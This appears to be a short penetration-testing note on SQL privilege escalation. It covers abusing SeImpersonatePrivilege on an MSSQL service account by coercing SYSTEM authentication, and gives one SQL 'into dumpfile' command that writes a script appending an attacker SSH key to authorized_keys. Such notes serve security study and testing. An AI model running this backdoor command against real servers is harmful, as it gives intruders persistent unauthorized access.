# SQL Privilege Escalation
## Token exploitation
A new instance of SQL is running as `NT Service\MSSQL$SQLEXPRESS` (default). This user has a special type of privilege called `SeImpersonatePrivilege`.
This allows the account to "impersonate a client after authentication".

Check if the privilege has been assigned:
[[Seatbelt#Get TokenPrivileges]]

In a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to.

The Problem:  
Account is not a local admin and can't get a handle to higher-privileged processes.

The Solution:
Force a SYSTEM service to authenticate to a man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

## Authorized keys
Create authorized_keys via .sh file created via dumpfile
```bash
select "echo 'ssh-rsa xxxx' >> /home/ubuntu/.ssh/authorized_keys" into dumpfile "/var/lib/mysql/come_in.sh";
```


## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```